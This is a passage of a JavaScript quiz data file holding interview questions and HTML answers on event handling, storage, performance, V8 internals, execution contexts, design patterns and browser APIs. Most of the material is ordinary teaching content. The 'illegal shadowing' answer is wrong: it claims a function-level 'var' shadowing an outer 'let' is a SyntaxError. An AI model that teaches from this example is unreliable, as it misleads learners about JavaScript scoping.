   a:"Unreleased listeners prevent garbage collection of referenced objects — causing <strong>memory leaks</strong>.<br><pre>// LEAK — listener holds reference to bigData\nconst bigData = new Array(1e6).fill('x');\nbtn.addEventListener('click', () => console.log(bigData[0]));\n// Even if btn is removed from DOM, bigData stays in memory\n\n// FIX 1 — remove by same reference\nconst handler = () => doWork();\nbtn.addEventListener('click', handler);\nbtn.removeEventListener('click', handler);\n\n// FIX 2 — AbortController (modern, removes all at once)\nconst ctrl = new AbortController();\nbtn.addEventListener('click', handler, { signal: ctrl.signal });\nctrl.abort(); // removes all listeners registered with this signal</pre>"},

  {q:"What is the difference between DOMContentLoaded and load events?",d:"medium",
   a:"<strong>DOMContentLoaded</strong> — fires when HTML is parsed and DOM is ready. CSS/images may still be loading.<br><strong>load</strong> — fires when <em>all</em> resources (images, stylesheets) are fully loaded.<br><pre>// DOMContentLoaded — fastest, for DOM manipulation\ndocument.addEventListener('DOMContentLoaded', () => {\n  document.getElementById('btn').addEventListener('click', handler);\n});\n\n// load — when you need image dimensions, etc.\nwindow.addEventListener('load', () => {\n  const img = document.getElementById('hero');\n  console.log(img.naturalWidth); // actual image width available\n});</pre>"},

  {q:"What are the differences between cookie, localStorage, and sessionStorage?",d:"medium",
   a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>Cookie</th><th style='padding:4px 8px'>localStorage</th><th style='padding:4px 8px'>sessionStorage</th></tr><tr><td style='padding:4px 8px'>Capacity</td><td style='padding:4px 8px'>~4KB</td><td style='padding:4px 8px'>~5MB</td><td style='padding:4px 8px'>~5MB</td></tr><tr><td style='padding:4px 8px'>Expires</td><td style='padding:4px 8px'>Set manually</td><td style='padding:4px 8px'>Never</td><td style='padding:4px 8px'>Tab close</td></tr><tr><td style='padding:4px 8px'>Sent to server</td><td style='padding:4px 8px'>Yes (every request)</td><td style='padding:4px 8px'>No</td><td style='padding:4px 8px'>No</td></tr></table><br><pre>localStorage.setItem('key', 'value');\nlocalStorage.getItem('key');\nlocalStorage.removeItem('key');\n// sessionStorage has same API but clears on tab close</pre>"},

  {q:"What is setTimeout and setInterval?",d:"easy",
   a:"<strong>setTimeout</strong> — executes a function <em>once</em> after a delay.<br><strong>setInterval</strong> — executes repeatedly at a fixed interval.<br><pre>// setTimeout\nconst id = setTimeout(() => console.log('once'), 1000);\nclearTimeout(id); // cancel\n\n// setInterval\nconst id2 = setInterval(() => console.log('tick'), 2000);\nclearInterval(id2); // stop\n\n// setTimeout 0 — defer to next event loop iteration\nsetTimeout(() => console.log('deferred'), 0);\n\n// Drift-free recursive pattern\nfunction tick() {\n  doWork();\n  setTimeout(tick, 1000); // next tick after work finishes\n}</pre>"}
);


// ── BATCH 2-H: Performance & Optimization ────────────────────────────────────
SEC_JS.qs.push(
  {q:"What is debouncing?",d:"medium",
   a:"<strong>Debouncing</strong> delays a function call until a specified time has passed since the last invocation. Ideal for search inputs, resize handlers.<br><pre>function debounce(fn, delay) {\n  let timer;\n  return function(...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delay);\n  };\n}\n\nconst search = debounce(query => fetchResults(query), 300);\ninput.addEventListener('input', e => search(e.target.value));\n// Fires 300ms AFTER the user stops typing</pre>"},

  {q:"What is throttling?",d:"medium",
   a:"<strong>Throttling</strong> ensures a function is called at most once per time interval, regardless of how many times it is triggered.<br><pre>function throttle(fn, limit) {\n  let inThrottle = false;\n  return function(...args) {\n    if (!inThrottle) {\n      fn.apply(this, args);\n      inThrottle = true;\n      setTimeout(() => inThrottle = false, limit);\n    }\n  };\n}\n\nconst onScroll = throttle(() => updateUI(), 100);\nwindow.addEventListener('scroll', onScroll);\n// Fires at most once every 100ms regardless of scroll speed\n\n// Debounce vs Throttle:\n// Debounce — fires AFTER activity stops\n// Throttle — fires at MOST once per interval DURING activity</pre>"},

  {q:"What is the purpose of requestAnimationFrame?",d:"medium",
   a:"<code>requestAnimationFrame(callback)</code> schedules a callback before the browser's next repaint (~60fps/16ms). Best for animations.<br><pre>// BAD — setInterval doesn't sync with repaint\nsetInterval(() => el.style.left = x++ + 'px', 16);\n\n// GOOD — syncs with display refresh\nfunction animate(timestamp) {\n  const elapsed = timestamp - startTime;\n  el.style.transform = 'translateX(' + (elapsed * 0.1) + 'px)';\n  if (elapsed < 2000) requestAnimationFrame(animate);\n}\nconst startTime = performance.now();\nrequestAnimationFrame(animate);\n\n// Benefits:\n// — Pauses when tab is hidden (battery-friendly)\n// — Synced with display refresh rate\n// — Smoother than setTimeout\nconst id = requestAnimationFrame(cb);\ncancelAnimationFrame(id); // cancel</pre>"},

  {q:"What are possible causes of memory leaks in JavaScript?",d:"hard",
   a:"<strong>1. Forgotten timers / intervals:</strong><br><pre>const id = setInterval(() => process(bigArray), 1000);\n// Fix: clearInterval(id) when done</pre><br><strong>2. Detached DOM nodes:</strong><br><pre>let el = document.getElementById('modal');\ndocument.body.removeChild(el);\n// el variable still holds ref — not GC'd\nel = null; // Fix</pre><br><strong>3. Closures holding large objects:</strong><br><pre>function setup() {\n  const bigData = new Array(1e6).fill(0);\n  btn.addEventListener('click', () => console.log(bigData)); // bigData never freed\n}</pre><br><strong>4. Unremoved event listeners</strong> (see previous question).<br><strong>5. Global variables</strong> — variables on <code>window</code> are never GC'd.<br><strong>6. Circular references</strong> in older engines.<br><br><strong>Prevention:</strong> use WeakMap/WeakSet for object associations, always clear timers, remove listeners with AbortController."},

  {q:"What are V8 engine optimization techniques?",d:"hard",
   a:"<strong>V8</strong> (Chrome/Node.js JS engine) optimizes JS with:<br><br><strong>1. JIT Compilation</strong> — interprets first, compiles hot paths to machine code via Turbofan.<br><br><strong>2. Hidden Classes</strong> — tracks object property layouts; same-shaped objects share a class for fast lookups.<br><pre>// Good — consistent shape\nfunction Point(x, y) { this.x = x; this.y = y; }\nconst p1 = new Point(1,2), p2 = new Point(3,4); // same hidden class</pre><br><strong>3. Inline Caching</strong> — caches property lookup results by hidden class.<br><br><strong>4. Garbage Collection</strong> — generational GC (young/old space), incremental marking to reduce pauses.<br><br><strong>5. Ignition</strong> — bytecode interpreter; Turbofan — optimizing compiler for hot functions."},

  {q:"What are hidden classes in V8?",d:"hard",
   a:"<strong>Hidden classes</strong> (shapes/maps) are internal structures V8 creates for objects to enable fast property access.<br><pre>// Same construction order → same hidden class → fast\nfunction User(name, age) {\n  this.name = name; // shape C1: { name }\n  this.age = age;   // shape C2: { name, age }\n}\nconst u1 = new User('Alice', 30);\nconst u2 = new User('Bob', 25); // shares C2 — cache hit!\n\n// Different order → different hidden classes → slow\nconst o1 = {}; o1.x = 1; o1.y = 2; // shape {x,y}\nconst o2 = {}; o2.y = 2; o2.x = 1; // shape {y,x} — different!</pre><br><strong>Tips:</strong> initialize all properties in constructor, in same order, avoid <code>delete</code>."},

  {q:"What is inline caching in V8?",d:"hard",
   a:"<strong>Inline Caching (IC)</strong> caches property lookup results based on an object's hidden class, turning repeated lookups into near-instant accesses.<br><pre>function getAge(user) { return user.age; }\n\n// First call: V8 looks up hidden class, finds 'age' at offset 8, caches it\n// Subsequent calls: cache hit — no lookup needed\n\n// Monomorphic (best) — always same shape\ngetAge(new User('A',30)); // same hidden class every call\n\n// Megamorphic (worst) — 5+ different shapes\n// V8 clears cache — falls back to slow lookup</pre><br><strong>Practical tip:</strong> always pass same-shaped objects to the same function."},

  {q:"What is tree shaking?",d:"medium",
   a:"<strong>Tree shaking</strong> is dead-code elimination — bundlers (Webpack, Rollup) remove exported code that is never imported.<br><pre>// utils.js\nexport function add(a, b) { return a + b; }\nexport function sub(a, b) { return a - b; } // unused\nexport function mul(a, b) { return a * b; } // unused\n\n// main.js\nimport { add } from './utils.js';\n// Bundle includes ONLY 'add' — sub and mul are tree-shaken out</pre><br><strong>Requirements:</strong><ul><li>ES modules (<code>import/export</code>) — not CommonJS <code>require()</code></li><li>Static imports (no dynamic <code>require</code>)</li><li>Production build with minification</li></ul>"},

  {q:"What is a polyfill?",d:"easy",
   a:"A <strong>polyfill</strong> is code that implements a modern feature for older environments that don't support it natively.<br><pre>// Add Array.prototype.includes if missing\nif (!Array.prototype.includes) {\n  Array.prototype.includes = function(searchEl, fromIndex) {\n    const len = this.length;\n    for (let i = fromIndex || 0; i < len; i++) {\n      if (this[i] === searchEl) return true;\n    }\n    return false;\n  };\n}</pre><br><strong>Tools:</strong> Babel + <code>@babel/preset-env</code>, <code>core-js</code>, <code>polyfill.io</code> (loads only needed polyfills based on browser)."},

  {q:"What is Babel?",d:"easy",
   a:"<strong>Babel</strong> is a JavaScript transpiler that converts modern ES6+ code into backward-compatible ES5 for older browsers.<br><pre>// Input (ES6+)\nconst greet = (name = 'World') => `Hello, ${name}!`;\n\n// Babel output (ES5)\n'use strict';\nvar greet = function(name) {\n  if (name === undefined) name = 'World';\n  return 'Hello, ' + name + '!';\n};</pre><br><strong>Key presets:</strong><ul><li><code>@babel/preset-env</code> — transpile based on target browsers</li><li><code>@babel/preset-react</code> — JSX → JS</li><li><code>@babel/preset-typescript</code> — TS → JS</li></ul><strong>Note:</strong> Babel handles syntax; use <code>core-js</code> for API polyfills (Promise, Array.from, etc.)"}
);


// ── BATCH 3-I: Execution Context & Memory ────────────────────────────────────
SEC_JS.qs.push(
  {q:"What is global execution context?",d:"medium",
   a:"The <strong>global execution context</strong> is the default context created when a JS file first runs — before any function is called.<br><br><strong>It creates:</strong><ul><li>A global object (<code>window</code> in browsers, <code>global</code> in Node.js)</li><li><code>this</code> bound to the global object</li><li>Memory space for variables and functions</li></ul><pre>// In the browser global context:\nconsole.log(this === window);  // true\nconsole.log(globalThis);       // universal reference (ES2020)\n\nvar x = 10;\nconsole.log(window.x); // 10 — var in global context attaches to window\n\nlet y = 20;\nconsole.log(window.y); // undefined — let/const do NOT attach to window</pre>"},

  {q:"What is function execution context?",d:"medium",
   a:"A <strong>function execution context</strong> is created each time a function is called. It is pushed onto the call stack and destroyed when the function returns.<br><br><strong>Each context contains:</strong><ul><li><strong>Variable Environment</strong> — <code>var</code> declarations, function declarations</li><li><strong>Lexical Environment</strong> — <code>let</code>/<code>const</code>, the outer reference (scope chain)</li><li><strong>this</strong> binding</li></ul><pre>function outer() {\n  let x = 10;           // in outer's lexical env\n  function inner() {\n    let y = 20;         // in inner's lexical env\n    console.log(x);   // looks up scope chain — finds x in outer's env\n  }\n  inner(); // new execution context pushed\n}\nouter();</pre>"},

  {q:"What is an environment record?",d:"hard",
   a:"An <strong>environment record</strong> is the internal spec mechanism that stores identifier bindings (variables, functions) for a given scope.<br><br><strong>Types:</strong><ul><li><strong>Declarative Environment Record</strong> — stores <code>let</code>, <code>const</code>, <code>function</code>, <code>class</code> bindings</li><li><strong>Object Environment Record</strong> — wraps an object (<code>with</code> statement, global <code>var</code>/<code>function</code> → stored on <code>window</code>)</li><li><strong>Global Environment Record</strong> — combination of both for the global scope</li></ul><pre>// Conceptually, each scope has an environment record:\n{\n  // Declarative record for this block\n  let x = 10;      // x → 10\n  const y = 20;    // y → 20\n  // outer: reference to enclosing record (scope chain)\n}</pre>"},

  {q:"What are the phases of execution context creation?",d:"hard",
   a:"Each execution context is created in <strong>two phases</strong>:<br><br><strong>1. Creation Phase</strong> — before code runs:<ul><li>Set up <code>this</code> binding</li><li>Create scope chain (outer environment reference)</li><li>Memory allocation: <code>var</code> declarations → <code>undefined</code>, functions → fully hoisted</li></ul><br><strong>2. Execution Phase</strong> — code runs line by line:<ul><li>Assign values to variables</li><li>Execute statements</li></ul><pre>// Demonstrates creation vs execution phase\nconsole.log(x); // undefined (hoisted in creation phase)\nconsole.log(greet); // [Function: greet] (fully hoisted)\nvar x = 5;\nfunction greet() { return 'hi'; }\nconsole.log(x); // 5 (assigned in execution phase)</pre>"},

  {q:"What is module scope in JavaScript?",d:"medium",
   a:"<strong>Module scope</strong> is the scope created for each ES module file. Variables declared at the top level of a module are NOT added to the global scope.<br><pre>// counter.js (ES module)\nlet count = 0; // module scope — NOT on window\nexport function increment() { count++; }\nexport function getCount() { return count; }\n\n// main.js\nimport { increment, getCount } from './counter.js';\nincrement();\nconsole.log(getCount()); // 1\nconsole.log(window.count); // undefined — not global</pre><br><strong>Key differences from script scope:</strong><ul><li>Always strict mode</li><li>Top-level <code>this</code> is <code>undefined</code></li><li>Loaded asynchronously with <code>&lt;script type=\"module\"&gt;</code></li><li>Each module evaluated once (cached)</li></ul>"},

  {q:"What are shadowing and illegal shadowing?",d:"hard",
   a:"<strong>Shadowing</strong> is when a variable in an inner scope has the same name as one in an outer scope, hiding the outer one.<br><pre>let x = 'global';\nfunction outer() {\n  let x = 'outer'; // shadows global x\n  function inner() {\n    let x = 'inner'; // shadows outer x\n    console.log(x); // 'inner'\n  }\n  inner();\n  console.log(x); // 'outer'\n}</pre><br><strong>Illegal shadowing</strong> — you CANNOT shadow a <code>let</code> variable with <code>var</code> in the same or inner scope:<br><pre>let a = 10;\nfunction test() {\n  var a = 20; // SyntaxError: Identifier 'a' has already been declared\n}\n\n// But var CAN be shadowed by let:\nvar b = 10;\nfunction test2() {\n  let b = 20; // OK</pre>"},

  {q:"What is the heap in JavaScript?",d:"easy",
   a:"The <strong>heap</strong> is the memory region where objects, arrays, and closures are dynamically allocated. Unlike the call stack (fixed, LIFO), the heap is unstructured.<br><pre>// Stack: primitive values and references\nlet num = 42;        // stored on stack\nlet str = 'hello';   // stored on stack\n\n// Heap: objects and arrays\nlet obj = { x: 1 };  // obj reference on stack,\n                     // actual { x:1 } object on heap\nlet arr = [1,2,3];   // arr reference on stack, array on heap</pre><br><strong>Garbage collection</strong> reclaims heap memory when objects have no more references (Mark & Sweep algorithm in V8)."},

  {q:"What is an event table?",d:"medium",
   a:"The <strong>event table</strong> (Web APIs container) is where asynchronous operations (setTimeout, fetch, event listeners) are registered and tracked by the browser/Node.js runtime.<br><pre>// When you call setTimeout:\nsetTimeout(callback, 1000);\n// 1. 'callback' is registered in the event table with a 1000ms timer\n// 2. JS continues executing synchronously\n// 3. After 1000ms, the event table moves callback to the Callback Queue\n// 4. Event loop picks it up when the call stack is empty</pre><br><strong>Flow:</strong> <code>setTimeout</code> → Event Table (waiting) → Callback Queue (ready) → Call Stack (executing)"},

  {q:"What is the microTask queue?",d:"medium",
   a:"The <strong>microtask queue</strong> holds high-priority callbacks (Promise callbacks, <code>queueMicrotask</code>) that are processed BEFORE any macrotask (setTimeout, setInterval).<br><pre>console.log('1');\nsetTimeout(() => console.log('2'), 0); // macrotask queue\nPromise.resolve().then(() => console.log('3')); // microtask queue\nqueueMicrotask(() => console.log('4')); // microtask queue\nconsole.log('5');\n\n// Output: 1 → 5 → 3 → 4 → 2\n// Sync first, then ALL microtasks, then ONE macrotask, then ALL microtasks again</pre><br><strong>Rule:</strong> the event loop drains the entire microtask queue before taking the next macrotask."},

  {q:"How do you make an object iterable in JavaScript?",d:"hard",
   a:"Implement <code>[Symbol.iterator]()</code> returning an iterator (object with <code>next()</code>).<br><pre>class Range {\n  constructor(start, end) {\n    this.start = start;\n    this.end = end;\n  }\n  [Symbol.iterator]() {\n    let current = this.start;\n    const end = this.end;\n    return {\n      next() {\n        return current <= end\n          ? { value: current++, done: false }\n          : { value: undefined, done: true };\n      }\n    };\n  }\n}\n\nconst range = new Range(1, 5);\nfor (const n of range) console.log(n); // 1,2,3,4,5\n[...range];       // [1,2,3,4,5]\nconst [a,b] = range; // destructuring works too</pre>"}
);


// ── BATCH 3-J: Design Patterns & Architecture ─────────────────────────────────
SEC_JS.qs.push(
  {q:"What is the module pattern?",d:"medium",
   a:"The <strong>module pattern</strong> uses IIFEs and closures to create private state and a public API — the original way to encapsulate code before ES modules.<br><pre>const counter = (function() {\n  let _count = 0; // private\n\n  return {\n    increment() { _count++; },\n    decrement() { _count--; },\n    getCount()  { return _count; }\n  };\n})();\n\ncounter.increment();\ncounter.increment();\nconsole.log(counter.getCount()); // 2\nconsole.log(counter._count);     // undefined — private!</pre><br><strong>Revealing module variant:</strong><br><pre>const myModule = (function() {\n  let private = 'secret';\n  function expose() { return private; }\n  return { expose }; // reveal only what's public\n})();</pre>"},

  {q:"What is Function Composition?",d:"hard",
   a:"<strong>Function composition</strong> combines multiple functions so the output of one becomes the input of the next.<br><pre>// compose — right to left\nconst compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);\n\n// pipe — left to right (more readable)\nconst pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);\n\nconst double  = x => x * 2;\nconst addOne  = x => x + 1;\nconst square  = x => x * x;\n\n// pipe: double → addOne → square\nconst transform = pipe(double, addOne, square);\ntransform(3); // square(addOne(double(3))) = square(7) = 49\n\n// Real use: data pipeline\nconst processUser = pipe(\n  user => ({ ...user, name: user.name.trim() }),\n  user => ({ ...user, age: Number(user.age) }),\n  user => ({ ...user, isAdult: user.age >= 18 })\n);</pre>"},

  {q:"What is a thunk function?",d:"medium",
   a:"A <strong>thunk</strong> is a function that wraps another function to delay its evaluation — 'thunking' the computation.<br><pre>// Synchronous thunk — delays computation\nfunction add(a, b) { return a + b; }\nconst thunk = () => add(1, 2); // wrap, don't call\nthunk(); // 3 — called later\n\n// Async thunk pattern (used in Redux-Thunk)\nfunction fetchUser(id) {\n  return function(dispatch) { // returns a thunk\n    dispatch({ type: 'FETCH_START' });\n    return fetch('/api/users/' + id)\n      .then(r => r.json())\n      .then(user => dispatch({ type: 'FETCH_SUCCESS', user }));\n  };\n}\n\n// Lazy evaluation\nconst lazySquare = n => () => n * n;\nconst getSquareOf5 = lazySquare(5); // not computed yet\ngetSquareOf5(); // 25 — computed now</pre>"},

  {q:"What are asynchronous thunks?",d:"hard",
   a:"<strong>Async thunks</strong> are functions that accept a callback (or return a Promise) and execute async work when called.<br><pre>// Callback-style async thunk\nfunction getUser(id) {\n  return function(callback) { // the async thunk\n    fetch('/api/users/' + id)\n      .then(r => r.json())\n      .then(user => callback(null, user))\n      .catch(err => callback(err));\n  };\n}\n\nconst userThunk = getUser(42);\nuserThunk((err, user) => console.log(user));\n\n// Promise-based async thunk\nconst fetchThunk = id => () => fetch('/api/' + id).then(r => r.json());\nconst getUserThunk = fetchThunk(42);\nconst user = await getUserThunk(); // execute when needed</pre>"},

  {q:"Does JavaScript support mixins?",d:"medium",
   a:"JavaScript doesn't have native mixins but they can be simulated with <code>Object.assign</code> or factory functions.<br><pre>// Mixin via Object.assign\nconst Serializable = {\n  serialize()   { return JSON.stringify(this); },\n  deserialize(s){ return JSON.parse(s); }\n};\nconst Validatable = {\n  validate() { return Object.keys(this).every(k => this[k] !== null); }\n};\n\nclass User {\n  constructor(name, email) { this.name = name; this.email = email; }\n}\nObject.assign(User.prototype, Serializable, Validatable);\n\nconst u = new User('Alice', 'a@b.com');\nu.serialize();  // '{\"name\":\"Alice\",...}'\nu.validate();   // true\n\n// Functional mixin pattern\nconst withLogging = Base => class extends Base {\n  log(msg) { console.log('[LOG]', msg); }\n};</pre>"},

  {q:"What are the differences between Promises and Observables?",d:"hard",
   a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>Promise</th><th style='padding:4px 8px'>Observable (RxJS)</th></tr><tr><td style='padding:4px 8px'>Values</td><td style='padding:4px 8px'>Single value</td><td style='padding:4px 8px'>Multiple values (stream)</td></tr><tr><td style='padding:4px 8px'>Lazy</td><td style='padding:4px 8px'>No (eager)</td><td style='padding:4px 8px'>Yes (only runs when subscribed)</td></tr><tr><td style='padding:4px 8px'>Cancellable</td><td style='padding:4px 8px'>No</td><td style='padding:4px 8px'>Yes (unsubscribe)</td></tr><tr><td style='padding:4px 8px'>Operators</td><td style='padding:4px 8px'>then/catch</td><td style='padding:4px 8px'>map, filter, debounceTime, etc.</td></tr></table><br><pre>// Promise — single async value\nfetch('/api/data').then(r => r.json()).then(process);\n\n// Observable — stream of values (e.g. WebSocket, input events)\nimport { fromEvent } from 'rxjs';\nimport { debounceTime, map } from 'rxjs/operators';\n\nconst input$ = fromEvent(searchInput, 'input').pipe(\n  debounceTime(300),\n  map(e => e.target.value)\n);\nconst sub = input$.subscribe(query => search(query));\nsub.unsubscribe(); // cancel anytime</pre>"},

  {q:"What is an Observable?",d:"hard",
   a:"An <strong>Observable</strong> is a lazy push-based data stream that emits 0 or more values over time. It only starts emitting when subscribed.<br><pre>import { Observable } from 'rxjs';\n\n// Create\nconst obs$ = new Observable(subscriber => {\n  subscriber.next(1);\n  subscriber.next(2);\n  setTimeout(() => {\n    subscriber.next(3);\n    subscriber.complete();\n  }, 1000);\n});\n\n// Subscribe\nconst sub = obs$.subscribe({\n  next:     value => console.log('value:', value),\n  error:    err   => console.error('error:', err),\n  complete: ()    => console.log('done')\n});\n// Logs: value:1, value:2, value:3 (after 1s), done\n\nsub.unsubscribe(); // cancel subscription</pre>"},

  {q:"What is a decorator in JavaScript?",d:"hard",
   a:"A <strong>decorator</strong> is a function that wraps another function or class to add behaviour without modifying the original code. Currently a Stage 3 TC39 proposal.<br><pre>// Function decorator (manual pattern)\nfunction readonly(target, key, descriptor) {\n  descriptor.writable = false;\n  return descriptor;\n}\n\nfunction log(fn) {\n  return function(...args) {\n    console.log('Calling', fn.name, 'with', args);\n    const result = fn.apply(this, args);\n    console.log('Result:', result);\n    return result;\n  };\n}\n\n// Class decorator (TypeScript / TC39 proposal)\n@sealed\nclass BankAccount {\n  @readonly balance = 1000;\n  @log\n  deposit(amount) { this.balance += amount; }\n}</pre>"},

  {q:"What is a short circuit condition?",d:"medium",
   a:"<strong>Short-circuit evaluation</strong> means JS stops evaluating an expression as soon as the result is determined.<br><pre>// && (AND) — stops at first falsy value\nfalse && doSomething(); // doSomething() NOT called\ntrue  && doSomething(); // doSomething() IS called\n\n// || (OR) — stops at first truthy value\ntrue  || doSomething(); // doSomething() NOT called\nfalse || doSomething(); // doSomething() IS called\n\n// Common patterns\nconst user = getUser() || defaultUser; // fallback\nuser && user.login(); // safe call\nconfig.debug && console.log(data); // conditional log\n\n// Nullish coalescing (only null/undefined, not 0/'')\nconst val = input ?? 'default';</pre>"},

  {q:"What are the different error types from the Error object?",d:"medium",
   a:"JavaScript has several built-in error types:<br><pre>// RangeError — value out of allowed range\nnew Array(-1); // RangeError: Invalid array length\n(1.23456).toFixed(200); // RangeError\n\n// ReferenceError — accessing undeclared variable\nconsole.log(undeclaredVar); // ReferenceError\n\n// SyntaxError — invalid JS syntax (caught at parse time)\n// eval('const a = ;'); // SyntaxError\n\n// TypeError — wrong type of operand\nnull.property;     // TypeError: Cannot read properties of null\nundefined();       // TypeError: undefined is not a function\n\n// URIError — malformed URI\ndecodeURIComponent('%'); // URIError\n\n// EvalError — issue with eval() (rare)\n\n// Custom error\nclass AppError extends Error {\n  constructor(message, code) {\n    super(message);\n    this.name = 'AppError';\n    this.code = code;\n  }\n}</pre>"}
);


// ── BATCH 3-K: Web APIs & Miscellaneous ──────────────────────────────────────
SEC_JS.qs.push(
  {q:"What is a service worker?",d:"medium",
   a:"A <strong>service worker</strong> is a script that runs in the background (separate thread), acting as a network proxy — enabling offline support, background sync, and push notifications.<br><pre>// Register\nif ('serviceWorker' in navigator) {\n  navigator.serviceWorker.register('/sw.js')\n    .then(reg => console.log('SW registered', reg));\n}\n\n// sw.js — cache assets on install\nself.addEventListener('install', event => {\n  event.waitUntil(\n    caches.open('v1').then(cache =>\n      cache.addAll(['/index.html', '/styles.css', '/app.js'])\n    )\n  );\n});\n\n// Intercept fetch requests\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request)\n      .then(cached => cached || fetch(event.request))\n  );\n});</pre>"},

  {q:"What is a web worker?",d:"medium",
   a:"A <strong>web worker</strong> runs JS in a background thread — separate from the main UI thread — for CPU-intensive tasks without blocking the UI.<br><pre>// main.js\nconst worker = new Worker('worker.js');\nworker.postMessage({ data: bigArray }); // send data\nworker.onmessage = e => console.log('Result:', e.data);\nworker.onerror   = e => console.error(e.message);\nworker.terminate(); // stop when done\n\n// worker.js (no DOM access!)\nself.onmessage = function(e) {\n  const result = heavyComputation(e.data.data);\n  self.postMessage(result); // send back\n};</pre><br><strong>Limitations:</strong> no access to DOM, <code>window</code>, or <code>document</code>. Communication via <code>postMessage</code>."},

  {q:"What is IndexedDB?",d:"medium",
   a:"<strong>IndexedDB</strong> is a low-level browser API for storing large amounts of structured data (including files/blobs) client-side, with support for transactions and indexes.<br><pre>// Open database\nconst request = indexedDB.open('MyDB', 1);\n\nrequest.onupgradeneeded = event => {\n  const db = event.target.result;\n  const store = db.createObjectStore('users', { keyPath: 'id' });\n  store.createIndex('email', 'email', { unique: true });\n};\n\nrequest.onsuccess = event => {\n  const db = event.target.result;\n  const tx = db.transaction('users', 'readwrite');\n  tx.objectStore('users').add({ id: 1, name: 'Alice', email: 'a@b.com' });\n};</pre><br><strong>vs localStorage:</strong> IndexedDB supports complex objects, large data, indexes, and async operations. localStorage is synchronous and string-only."},

  {q:"What is AJAX?",d:"easy",
   a:"<strong>AJAX</strong> (Asynchronous JavaScript And XML) is a technique for making HTTP requests from the browser without reloading the page.<br><pre>// Old way: XMLHttpRequest\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', '/api/users');\nxhr.onload = () => console.log(JSON.parse(xhr.responseText));\nxhr.onerror = () => console.error('Request failed');\nxhr.send();\n\n// Modern way: fetch (Promise-based)\nfetch('/api/users')\n  .then(res => res.json())\n  .then(users => console.log(users));\n\n// POST with fetch\nfetch('/api/users', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ name: 'Alice' })\n});</pre>"},

  {q:"How do you cancel a fetch request?",d:"medium",
   a:"Use <strong>AbortController</strong> to cancel an in-flight <code>fetch</code>.<br><pre>const controller = new AbortController();\nconst { signal } = controller;\n\nfetch('/api/data', { signal })\n  .then(res => res.json())\n  .then(data => console.log(data))\n  .catch(err => {\n    if (err.name === 'AbortError') console.log('Fetch cancelled');\n    else throw err;\n  });\n\n// Cancel after 5 seconds\nsetTimeout(() => controller.abort(), 5000);\n\n// Cancel on user action\ncancelBtn.addEventListener('click', () => controller.abort());</pre>"},

  {q:"What is a Regular Expression in JavaScript?",d:"easy",
   a:"A <strong>Regular Expression (RegExp)</strong> is a pattern used to match character combinations in strings.<br><pre>// Literal notation\nconst re = /hello/i; // i = case-insensitive\n\n// Constructor\nconst re2 = new RegExp('hello', 'i');\n\n// Test — returns boolean\n/^\\d+$/.test('123');   // true (all digits)\n/^\\d+$/.test('12a');   // false\n\n// Match — returns array\n'Hello World'.match(/\\w+/g); // ['Hello', 'World']\n\n// Replace\n'foo bar'.replace(/\\s+/g, '-'); // 'foo-bar'\n\n// Common patterns:\n// \\d — digit, \\w — word char, \\s — whitespace\n// ^ — start, $ — end, . — any char\n// * — 0+, + — 1+, ? — 0 or 1, {n,m} — range</pre>"},

  {q:"What is TypeScript?",d:"easy",
   a:"<strong>TypeScript</strong> is a statically-typed superset of JavaScript developed by Microsoft. It adds optional type annotations and compiles to plain JavaScript.<br><pre>// JavaScript\nfunction add(a, b) { return a + b; }\nadd('1', 2); // '12' — no error at runtime\n\n// TypeScript\nfunction add(a: number, b: number): number { return a + b; }\nadd('1', 2); // Error at COMPILE TIME: Argument of type string not assignable\n\n// Types\nlet name: string = 'Alice';\nlet age: number = 30;\nlet active: boolean = true;\nlet ids: number[] = [1, 2, 3];\n\n// Interface\ninterface User { name: string; age?: number; }\nconst u: User = { name: 'Alice' };</pre><br><strong>Benefits:</strong> catch bugs at compile time, better IDE autocomplete, self-documenting code."},

  {q:"What are the differences between JavaScript and TypeScript?",d:"medium",
   a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>JavaScript</th><th style='padding:4px 8px'>TypeScript</th></tr><tr><td style='padding:4px 8px'>Typing</td><td style='padding:4px 8px'>Dynamic</td><td style='padding:4px 8px'>Static (optional)</td></tr><tr><td style='padding:4px 8px'>Error detection</td><td style='padding:4px 8px'>Runtime</td><td style='padding:4px 8px'>Compile time</td></tr><tr><td style='padding:4px 8px'>Compilation</td><td style='padding:4px 8px'>Not needed</td><td style='padding:4px 8px'>Compiles to JS (tsc)</td></tr><tr><td style='padding:4px 8px'>Interfaces/Generics</td><td style='padding:4px 8px'>No</td><td style='padding:4px 8px'>Yes</td></tr><tr><td style='padding:4px 8px'>Browser support</td><td style='padding:4px 8px'>Native</td><td style='padding:4px 8px'>Needs compilation</td></tr></table><br>TypeScript is a <em>superset</em> — all valid JS is valid TS. Types are erased at compile time; the output is plain JS."},

  {q:"What is isNaN and how does it differ from Number.isNaN?",d:"medium",
   a:"<strong><code>isNaN()</code></strong> (global) coerces the argument to a number first, then checks if it's NaN — can give surprising results.<br><strong><code>Number.isNaN()</code></strong> (ES6) checks strictly — returns <code>true</code> ONLY if the value is the actual NaN number, no coercion.<br><pre>isNaN(NaN);         // true  ✓\nisNaN('hello');     // true  ← coerces 'hello' to NaN, then true (misleading!)\nisNaN(undefined);   // true  ← same reason\nisNaN('123');       // false ← coerces to 123, not NaN\n\nNumber.isNaN(NaN);         // true  ✓\nNumber.isNaN('hello');     // false ← no coercion, 'hello' is not NaN type\nNumber.isNaN(undefined);   // false\nNumber.isNaN(123);         // false</pre><br><strong>Rule:</strong> prefer <code>Number.isNaN()</code> for precise checks."},

  {q:"What is the optional chaining operator (?.)?",d:"easy",
